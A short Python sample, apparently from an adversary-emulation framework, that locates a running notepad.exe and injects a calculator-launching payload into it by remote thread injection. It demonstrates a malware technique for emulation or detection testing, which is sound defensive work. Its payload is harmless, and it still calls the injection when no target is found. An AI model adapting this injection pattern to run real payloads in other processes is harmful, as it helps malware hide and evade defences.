"""
Sample name: process_injection
Description: Simple process injection example
"""


from imet.server.api import winapi, imetapi, payloads


def emulate():
    """
    The main function to execute the sample's behavior.
    """
    processes = imetapi.enum_processes()
    process_handle = None
    process_id = 0
    for pid in processes:
        try:
            with imetapi.open_process(pid) as handle:
                process_name = imetapi.get_process_name(handle)
                if process_name == "notepad.exe":
                    process_handle = handle
                    process_id = pid
                    print(process_name, pid)
                    break
        except:
            pass
    if process_handle is None:
        print("Unable to locate Notepad.exe process, please make sure it's running.")
    
    imetapi.remote_thread_process_inject(process_id, payloads.WINDOWS_X64_CALC)

    
